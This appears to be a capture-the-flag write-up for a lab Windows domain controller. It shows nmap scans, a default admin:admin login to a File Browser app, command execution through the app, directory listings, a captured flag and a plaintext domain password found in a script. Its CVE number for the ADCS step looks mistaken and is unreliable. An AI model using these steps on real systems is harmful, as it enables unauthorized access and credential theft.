## machine Description

Certification is an easy level Windows machine that showcases a web application that allows Command Execution via events listed within the application. These events range from executing command line operations upon file upload, file change and a range of other file system level events. From these events, there is the potential of gaining a shell on the affected system. After gaining a shell, a password is found within a PowerShell script, which in turn allows the attacker to abuse Active Directory Certificate Services (ADCS). Enumeration shows the machine to be vulnerable to CVE-2022-26323, which provides the ability to create a machine account and tamper with the dnsHostName to create a certificate in the form of the Domain Controller and provide full domain compromise.

---
---
found creds:
$user = "daniel.morgan"
$pass = "FDOnolk(naws)"

---
---

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.232.79 -p- -sS -sV -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 14:27 EST
Nmap scan report for 10.129.232.79
Host is up (0.034s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-07 19:31:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certification.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certification.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certification.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certification.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          Golang net/http server
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
51917/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59199/tcp open  msrpc         Microsoft Windows RPC
59344/tcp open  msrpc         Microsoft Windows RPC
59387/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=2/7%Time=67A65EEF%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,11E6,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\
SF:x20no-cache,\x20no-store,\x20must-revalidate\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:
SF:\x20Fri,\x2007\x20Feb\x202025\x2019:31:40\x20GMT\r\n\r\n<!DOCTYPE\x20ht
SF:ml><html\x20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20http-
SF:equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"><meta\x20name=\"viewpo
SF:rt\"\x20content=\"width=device-width,initial-scale=1,user-scalable=no\"
SF:><title>File\x20Browser</title><link\x20rel=\"icon\"\x20type=\"image/pn
SF:g\"\x20sizes=\"32x32\"\x20href=\"/static/img/icons/favicon-32x32\.png\"
SF:><link\x20rel=\"icon\"\x20type=\"image/png\"\x20sizes=\"16x16\"\x20href
SF:=\"/static/img/icons/favicon-16x16\.png\"><link\x20rel=\"manifest\"\x20
SF:id=\"manifestPlaceholder\"\x20crossorigin=\"use-credentials\"><meta\x20
SF:name=\"theme-color\"\x20content=\"#2979ff\"><meta\x20name=\"apple-mobil
SF:e-web-app-capable\"\x20content=\"yes\"><meta\x20name=\"apple-mobile-web
SF:-app-status-bar-style\"\x20content=\"black\"><meta\x20name=\"apple-mobi
SF:le-web-app-title\"\x20content=\"assets\"><link\x20rel=\"appl")%r(FourOh
SF:FourRequest,11E6,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\x20no-cache,
SF:\x20no-store,\x20must-revalidate\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Fri,\x20
SF:07\x20Feb\x202025\x2019:31:41\x20GMT\r\n\r\n<!DOCTYPE\x20html><html\x20
SF:lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20http-equiv=\"X-UA
SF:-Compatible\"\x20content=\"IE=edge\"><meta\x20name=\"viewport\"\x20cont
SF:ent=\"width=device-width,initial-scale=1,user-scalable=no\"><title>File
SF:\x20Browser</title><link\x20rel=\"icon\"\x20type=\"image/png\"\x20sizes
SF:=\"32x32\"\x20href=\"/static/img/icons/favicon-32x32\.png\"><link\x20re
SF:l=\"icon\"\x20type=\"image/png\"\x20sizes=\"16x16\"\x20href=\"/static/i
SF:mg/icons/favicon-16x16\.png\"><link\x20rel=\"manifest\"\x20id=\"manifes
SF:tPlaceholder\"\x20crossorigin=\"use-credentials\"><meta\x20name=\"theme
SF:-color\"\x20content=\"#2979ff\"><meta\x20name=\"apple-mobile-web-app-ca
SF:pable\"\x20content=\"yes\"><meta\x20name=\"apple-mobile-web-app-status-
SF:bar-style\"\x20content=\"black\"><meta\x20name=\"apple-mobile-web-app-t
SF:itle\"\x20content=\"assets\"><link\x20rel=\"appl");
Service Info: Host: CFN-SVRDC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.72 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.232.79 -p- -sS -sV -T5 --script vuln
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 14:33 EST
Nmap scan report for 10.129.232.79
Host is up (0.034s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.232.79
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.232.79:80/
|     Form id: contact-form
|_    Form action: assets/contact.php
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-07 19:37:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certification.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certification.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certification.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certification.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          Golang net/http server
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Type: text/html; charset=utf-8
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 07 Feb 2025 19:37:52 GMT
|     <!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>File Browser</title><link rel="icon" type="image/png" sizes="32x32" href="/static/img/icons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/static/img/icons/favicon-16x16.png"><link rel="manifest" id="manifestPlaceholder" crossorigin="use-credentials"><meta name="theme-color" content="#2979ff"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="apple-mobile-web-app-title" content="assets"><link rel="appl
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
51917/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59199/tcp open  msrpc         Microsoft Windows RPC
59344/tcp open  msrpc         Microsoft Windows RPC
59387/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=2/7%Time=67A66063%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,11E6,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\
SF:x20no-cache,\x20no-store,\x20must-revalidate\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:
SF:\x20Fri,\x2007\x20Feb\x202025\x2019:37:52\x20GMT\r\n\r\n<!DOCTYPE\x20ht
SF:ml><html\x20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20http-
SF:equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"><meta\x20name=\"viewpo
SF:rt\"\x20content=\"width=device-width,initial-scale=1,user-scalable=no\"
SF:><title>File\x20Browser</title><link\x20rel=\"icon\"\x20type=\"image/pn
SF:g\"\x20sizes=\"32x32\"\x20href=\"/static/img/icons/favicon-32x32\.png\"
SF:><link\x20rel=\"icon\"\x20type=\"image/png\"\x20sizes=\"16x16\"\x20href
SF:=\"/static/img/icons/favicon-16x16\.png\"><link\x20rel=\"manifest\"\x20
SF:id=\"manifestPlaceholder\"\x20crossorigin=\"use-credentials\"><meta\x20
SF:name=\"theme-color\"\x20content=\"#2979ff\"><meta\x20name=\"apple-mobil
SF:e-web-app-capable\"\x20content=\"yes\"><meta\x20name=\"apple-mobile-web
SF:-app-status-bar-style\"\x20content=\"black\"><meta\x20name=\"apple-mobi
SF:le-web-app-title\"\x20content=\"assets\"><link\x20rel=\"appl")%r(FourOh
SF:FourRequest,11E6,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\x20no-cache,
SF:\x20no-store,\x20must-revalidate\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Fri,\x20
SF:07\x20Feb\x202025\x2019:37:52\x20GMT\r\n\r\n<!DOCTYPE\x20html><html\x20
SF:lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20http-equiv=\"X-UA
SF:-Compatible\"\x20content=\"IE=edge\"><meta\x20name=\"viewport\"\x20cont
SF:ent=\"width=device-width,initial-scale=1,user-scalable=no\"><title>File
SF:\x20Browser</title><link\x20rel=\"icon\"\x20type=\"image/png\"\x20sizes
SF:=\"32x32\"\x20href=\"/static/img/icons/favicon-32x32\.png\"><link\x20re
SF:l=\"icon\"\x20type=\"image/png\"\x20sizes=\"16x16\"\x20href=\"/static/i
SF:mg/icons/favicon-16x16\.png\"><link\x20rel=\"manifest\"\x20id=\"manifes
SF:tPlaceholder\"\x20crossorigin=\"use-credentials\"><meta\x20name=\"theme
SF:-color\"\x20content=\"#2979ff\"><meta\x20name=\"apple-mobile-web-app-ca
SF:pable\"\x20content=\"yes\"><meta\x20name=\"apple-mobile-web-app-status-
SF:bar-style\"\x20content=\"black\"><meta\x20name=\"apple-mobile-web-app-t
SF:itle\"\x20content=\"assets\"><link\x20rel=\"appl");
Service Info: Host: CFN-SVRDC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 636.94 seconds


```

- opena browser and login to the port 8000 (admin:admin)
- go to user settings and edit admin
- add command into the field that you will use
- go back to the "my files" tab
- click the <> button
```
_ht_

cmd /c dir

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\Program Files\filebrowser\certificates

04/07/2022  06:28    <DIR>          .
23/06/2022  14:20    <DIR>          ..
04/07/2022  06:28    <DIR>          anacondatech
04/07/2022  06:28    <DIR>          avoninc
04/07/2022  06:28    <DIR>          computeromatic
04/07/2022  06:28    <DIR>          digidelight
04/07/2022  06:28    <DIR>          incly
04/07/2022  06:28    <DIR>          itsecure
04/07/2022  06:28    <DIR>          megacorp
04/07/2022  06:28    <DIR>          securityify
04/07/2022  06:28    <DIR>          techaza
04/07/2022  06:28    <DIR>          techgenics
               0 File(s)              0 bytes
              12 Dir(s)   3,721,162,752 bytes free

_chevron_right_

cmd /c dir c:\

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\

18/05/2022  22:54    <DIR>          inetpub
08/05/2021  08:15    <DIR>          PerfLogs
23/06/2022  13:08    <DIR>          Program Files
08/05/2021  09:34    <DIR>          Program Files (x86)
23/06/2022  13:51    <DIR>          Users
19/05/2022  13:49    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   3,721,162,752 bytes free

_chevron_right_

cmd /c dir c:\windows

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\windows

05/07/2022  10:52    <DIR>          .
13/09/2022  15:48    <DIR>          $Reconfig$
08/05/2021  09:33    <DIR>          ADFS
18/05/2022  20:41    <DIR>          ADWS
08/05/2021  08:15    <DIR>          AppCompat
03/04/2022  05:36    <DIR>          apppatch
08/05/2021  08:15    <DIR>          AppReadiness
08/05/2021  09:37    <DIR>          assembly
03/04/2022  05:34           102,400 bfsvc.exe
08/05/2021  08:27    <DIR>          Boot
08/05/2021  08:15    <DIR>          Branding
18/05/2022  22:54    <DIR>          CbsTemp
18/05/2022  22:51               311 certenroll.log
18/05/2022  22:51            77,337 certocm.log
07/02/2025  19:19    <DIR>          debug
08/05/2021  08:15    <DIR>          diagnostics
08/05/2021  08:27    <DIR>          DiagTrack
08/05/2021  08:15    <DIR>          drivers
18/05/2022  20:15             1,987 DtcInstall.log
08/05/2021  09:34    <DIR>          en-US
08/05/2021  09:34    <DIR>          Globalization
08/05/2021  09:33    <DIR>          Help
18/05/2022  22:54            31,867 iis.log
08/05/2021  08:15    <DIR>          IME
23/08/2022  12:36    <DIR>          INF
08/05/2021  08:15    <DIR>          InputMethod
08/05/2021  08:15    <DIR>          L2Schemas
08/05/2021  08:15    <DIR>          LiveKernelReports
18/05/2022  20:14    <DIR>          Logs
08/05/2021  08:11            43,131 mib.bin
07/02/2025  19:29    <DIR>          Microsoft.NET
08/05/2021  08:15    <DIR>          Migration
07/05/2021  21:46           225,280 notepad.exe
07/02/2025  19:19    <DIR>          NTDS
18/05/2022  20:16    <DIR>          Panther
07/02/2025  19:19             1,656 PFRO.log
08/05/2021  08:27    <DIR>          PLA
03/04/2022  05:36    <DIR>          PolicyDefinitions
18/05/2022  20:15    <DIR>          Prefetch
08/05/2021  08:15    <DIR>          Provisioning
08/05/2021  08:11           397,312 regedit.exe
07/02/2025  19:19    <DIR>          Registration
08/05/2021  08:27    <DIR>          RemotePackages
08/05/2021  08:15    <DIR>          rescache
08/05/2021  08:15    <DIR>          resources
08/05/2021  08:15    <DIR>          SchCache
08/05/2021  08:27    <DIR>          schemas
19/05/2022  08:53    <DIR>          security
18/05/2022  20:14    <DIR>          ServiceProfiles
18/05/2022  20:15    <DIR>          ServiceState
03/04/2022  05:36    <DIR>          servicing
08/05/2021  08:17    <DIR>          Setup
08/05/2021  09:34    <DIR>          SKB
19/05/2022  07:53    <DIR>          SoftwareDistribution
08/05/2021  09:34    <DIR>          Speech
08/05/2021  09:34    <DIR>          Speech_OneCore
08/05/2021  08:15    <DIR>          System
08/05/2021  08:14               219 system.ini
07/02/2025  19:23    <DIR>          System32
03/04/2022  05:36    <DIR>          SystemResources
07/02/2025  19:29    <DIR>          SystemTemp
18/05/2022  20:54    <DIR>          SYSVOL
19/05/2022  13:47    <DIR>          SysWOW64
18/05/2022  20:15    <DIR>          Tasks
23/08/2022  12:42    <DIR>          Temp
08/05/2021  08:15    <DIR>          tracing
08/05/2021  08:15    <DIR>          Vss
08/05/2021  08:15    <DIR>          WaaS
08/05/2021  08:27    <DIR>          Web
08/05/2021  08:14                92 win.ini
07/02/2025  19:49               276 WindowsUpdate.log
18/05/2022  22:54    <DIR>          WinSxS
07/05/2021  21:58            28,672 write.exe
              13 File(s)        910,540 bytes
              60 Dir(s)   3,721,162,752 bytes free

_chevron_right_

cmd /c dir c:\users

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\users

23/06/2022  13:51    <DIR>          .
18/05/2022  20:19    <DIR>          Administrator
27/06/2022  20:59    <DIR>          daniel.morgan
18/05/2022  20:19    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   3,721,097,216 bytes free

_chevron_right_

cmd /c dir c:\users\Administrator

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\users\Administrator

File Not Found

_chevron_right_

cmd /c dir c:\users\daniel.morgan

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\users\daniel.morgan

27/06/2022  20:59    <DIR>          .
23/06/2022  13:51    <DIR>          ..
27/06/2022  20:59    <DIR>          3D Objects
27/06/2022  20:59    <DIR>          Contacts
30/06/2022  06:29    <DIR>          Desktop
04/07/2022  06:41    <DIR>          Documents
27/06/2022  20:59    <DIR>          Downloads
27/06/2022  20:59    <DIR>          Favorites
27/06/2022  20:59    <DIR>          Links
27/06/2022  20:59    <DIR>          Music
27/06/2022  20:59    <DIR>          Pictures
27/06/2022  20:59    <DIR>          Saved Games
27/06/2022  20:59    <DIR>          Searches
27/06/2022  20:59    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   3,721,031,680 bytes free

_chevron_right_

cmd /c dir c:\users\daniel.morgan\documents

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\users\daniel.morgan\documents

04/07/2022  06:41    <DIR>          .
27/06/2022  20:59    <DIR>          ..
23/06/2022  19:21               124 filebrowser.bat
               1 File(s)            124 bytes
               2 Dir(s)   3,721,031,680 bytes free

_chevron_right_

powershell -e get-content -path c:\users\daniel.morgan\documents\filebrowser.bat


PowerShell[.exe] [-PSConsoleFile <file> | -Version <version>]
    [-NoLogo] [-NoExit] [-Sta] [-Mta] [-NoProfile] [-NonInteractive]
    [-InputFormat {Text | XML}] [-OutputFormat {Text | XML}]
    [-WindowStyle <style>] [-EncodedCommand <Base64EncodedCommand>]
    [-ConfigurationName <string>]
    [-File <filePath> <args>] [-ExecutionPolicy <ExecutionPolicy>]
    [-Command { - | <script-block> [-args <arg-array>]
                  | <string> [<CommandParameters>] } ]

PowerShell[.exe] -Help | -? | /?

-PSConsoleFile
    Loads the specified Windows PowerShell console file. To create a console
    file, use Export-Console in Windows PowerShell.

-Version
    Starts the specified version of Windows PowerShell.
    Enter a version number with the parameter, such as "-version 2.0".

-NoLogo
    Hides the copyright banner at startup.

-NoExit
    Does not exit after running startup commands.

-Sta
    Starts the shell using a single-threaded apartment.
    Single-threaded apartment (STA) is the default.

-Mta
    Start the shell using a multithreaded apartment.

-NoProfile
    Does not load the Windows PowerShell profile.

-NonInteractive
    Does not present an interactive prompt to the user.

-InputFormat
    Describes the format of data sent to Windows PowerShell. Valid values are
    "Text" (text strings) or "XML" (serialized CLIXML format).

-OutputFormat
    Determines how output from Windows PowerShell is formatted. Valid values
    are "Text" (text strings) or "XML" (serialized CLIXML format).

-WindowStyle
    Sets the window style to Normal, Minimized, Maximized or Hidden.

-EncodedCommand
    Accepts a base-64-encoded string version of a command. Use this parameter
    to submit commands to Windows PowerShell that require complex quotation
    marks or curly braces.

-ConfigurationName
    Specifies a configuration endpoint in which Windows PowerShell is run.
    This can be any endpoint registered on the local machine including the
    default Windows PowerShell remoting endpoints or a custom endpoint having
    specific user role capabilities.

-File
    Runs the specified script in the local scope ("dot-sourced"), so that the
    functions and variables that the script creates are available in the
    current session. Enter the script file path and any parameters.
    File must be the last parameter in the command, because all characters
    typed after the File parameter name are interpreted
    as the script file path followed by the script parameters.

-ExecutionPolicy
    Sets the default execution policy for the current session and saves it
    in the $env:PSExecutionPolicyPreference environment variable.
    This parameter does not change the Windows PowerShell execution policy
    that is set in the registry.

-Command
    Executes the specified commands (and any parameters) as though they were
    typed at the Windows PowerShell command prompt, and then exits, unless
    NoExit is specified. The value of Command can be "-", a string. or a
    script block.

    If the value of Command is "-", the command text is read from standard
    input.

    If the value of Command is a script block, the script block must be enclosed
    in braces ({}). You can specify a script block only when running PowerShell.exe
    in Windows PowerShell. The results of the script block are returned to the
    parent shell as deserialized XML objects, not live objects.

    If the value of Command is a string, Command must be the last parameter
    in the command , because any characters typed after the command are
    interpreted as the command arguments.

    To write a string that runs a Windows PowerShell command, use the format:
	"& {<command>}"
    where the quotation marks indicate a string and the invoke operator (&)
    causes the command to be executed.

-Help, -?, /?
    Shows this message. If you are typing a PowerShell.exe command in Windows
    PowerShell, prepend the command parameters with a hyphen (-), not a forward
    slash (/). You can use either a hyphen or forward slash in Cmd.exe.

EXAMPLES
    PowerShell -PSConsoleFile SqlSnapIn.Psc1
    PowerShell -version 2.0 -NoLogo -InputFormat text -OutputFormat XML
    PowerShell -ConfigurationName AdminRoles
    PowerShell -Command {Get-EventLog -LogName security}
    PowerShell -Command "& {Get-EventLog -LogName security}"

    # To use the -EncodedCommand parameter:
    $command = 'dir "c:\program files" '
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    powershell.exe -encodedCommand $encodedCommand
Cannot process the command because the value specified with -EncodedCommand is not properly encoded. The value must be Base64 encoded.

_chevron_right_

powershell get-content -path c:\users\daniel.morgan\documents\filebrowser.bat

cd "c:\program files\filebrowser\"
cmd /c "c:\program files\filebrowser\filebrowser.exe" -p 8000 -a 0.0.0.0 -r certificates

_chevron_right_

powershell get-childitem -path "c:\program files\filebrowser"

get-childitem : Cannot find path 'C:\program' because it does not exist.
At line:1 char:1
+ get-childitem -path c:\program files\filebrowser
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\program:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

_chevron_right_

powershell gci -path "c:\program files\filebrowser"

gci : Cannot find path 'C:\program' because it does not exist.
At line:1 char:1
+ gci -path c:\program files\filebrowser
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\program:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

_chevron_right_

cmd /c dir "c:\program files\filebrowser"

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\program files\filebrowser

23/06/2022  14:20    <DIR>          .
23/06/2022  13:08    <DIR>          ..
04/07/2022  06:28    <DIR>          certificates
06/06/2022  14:01            38,009 CHANGELOG.md
07/02/2025  20:11            65,536 filebrowser.db
06/06/2022  14:08        21,826,048 filebrowser.exe
06/06/2022  14:01            11,356 LICENSE
06/06/2022  14:01             2,362 README.md
               5 File(s)     21,943,311 bytes
               3 Dir(s)   3,720,757,248 bytes free

_chevron_right_

cmd /c dir "c:\program files\filebrowser\certificates"

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\program files\filebrowser\certificates

04/07/2022  06:28    <DIR>          .
23/06/2022  14:20    <DIR>          ..
04/07/2022  06:28    <DIR>          anacondatech
04/07/2022  06:28    <DIR>          avoninc
04/07/2022  06:28    <DIR>          computeromatic
04/07/2022  06:28    <DIR>          digidelight
04/07/2022  06:28    <DIR>          incly
04/07/2022  06:28    <DIR>          itsecure
04/07/2022  06:28    <DIR>          megacorp
04/07/2022  06:28    <DIR>          securityify
04/07/2022  06:28    <DIR>          techaza
04/07/2022  06:28    <DIR>          techgenics
               0 File(s)              0 bytes
              12 Dir(s)   3,720,757,248 bytes free

_chevron_right_

cmd /c dir "c:\users"

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\users

23/06/2022  13:51    <DIR>          .
18/05/2022  20:19    <DIR>          Administrator
27/06/2022  20:59    <DIR>          daniel.morgan
18/05/2022  20:19    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   3,719,479,296 bytes free

_chevron_right_

cmd /c dir "c:\users\daniel.morgan"

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\users\daniel.morgan

27/06/2022  20:59    <DIR>          .
23/06/2022  13:51    <DIR>          ..
27/06/2022  20:59    <DIR>          3D Objects
27/06/2022  20:59    <DIR>          Contacts
30/06/2022  06:29    <DIR>          Desktop
04/07/2022  06:41    <DIR>          Documents
27/06/2022  20:59    <DIR>          Downloads
27/06/2022  20:59    <DIR>          Favorites
27/06/2022  20:59    <DIR>          Links
27/06/2022  20:59    <DIR>          Music
27/06/2022  20:59    <DIR>          Pictures
27/06/2022  20:59    <DIR>          Saved Games
27/06/2022  20:59    <DIR>          Searches
27/06/2022  20:59    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   3,719,479,296 bytes free

_chevron_right_

cmd /c dir "c:\users\daniel.morgan\desktop"

 Volume in drive C has no label.
 Volume Serial Number is AC9E-8FD3

 Directory of c:\users\daniel.morgan\desktop

30/06/2022  06:29    <DIR>          .
27/06/2022  20:59    <DIR>          ..
30/06/2022  06:29               891 applist.ps1
23/08/2022  12:35                70 user.txt
               2 File(s)            961 bytes
               2 Dir(s)   3,719,479,296 bytes free

_chevron_right_

powershell get-content user.txt

get-content : Cannot find path 'C:\Program Files\filebrowser\certificates\user.txt' because it does not exist.
At line:1 char:1
+ get-content user.txt
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Program File...icates\user.txt:String) [Get-Content], ItemNotFoundEx 
   ception
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand

_chevron_right_

powershell get-content c:\users\daniel.morgan\user.txt

get-content : Cannot find path 'C:\users\daniel.morgan\user.txt' because it does not exist.
At line:1 char:1
+ get-content c:\users\daniel.morgan\user.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\users\daniel.morgan\user.txt:String) [Get-Content], ItemNotFoundExce 
   ption
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand

_chevron_right_

powershell get-content c:\users\daniel.morgan\desktop\user.txt

62e18ca0f5614a750b1b2f3518957285

_chevron_right_

powershell get-content c:\users\daniel.morgan\desktop\applist.ps1

$user = "daniel.morgan"
$pass = "FDOnolk(naws)"

$list=@()
$InstalledSoftwareKey="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
$InstalledSoftware=[microsoft.win32.registrykey]::OpenRemoteBaseKey('LocalMachine',$pcname)
$RegistryKey=$InstalledSoftware.OpenSubKey($InstalledSoftwareKey)
$SubKeys=$RegistryKey.GetSubKeyNames()
Foreach ($key in $SubKeys){
$thisKey=$InstalledSoftwareKey+"\\"+$key
$thisSubKey=$InstalledSoftware.OpenSubKey($thisKey)
$obj = New-Object PSObject
$obj | Add-Member -MemberType NoteProperty -Name "ComputerName" -Value $pcname
$obj | Add-Member -MemberType NoteProperty -Name "DisplayName" -Value $($thisSubKey.GetValue("DisplayName"))
$obj | Add-Member -MemberType NoteProperty -Name "DisplayVersion" -Value $($thisSubKey.GetValue("DisplayVersion"))
$list += $obj
}
$list | where { $_.DisplayName } | select ComputerName, DisplayName, DisplayVersion | FT
```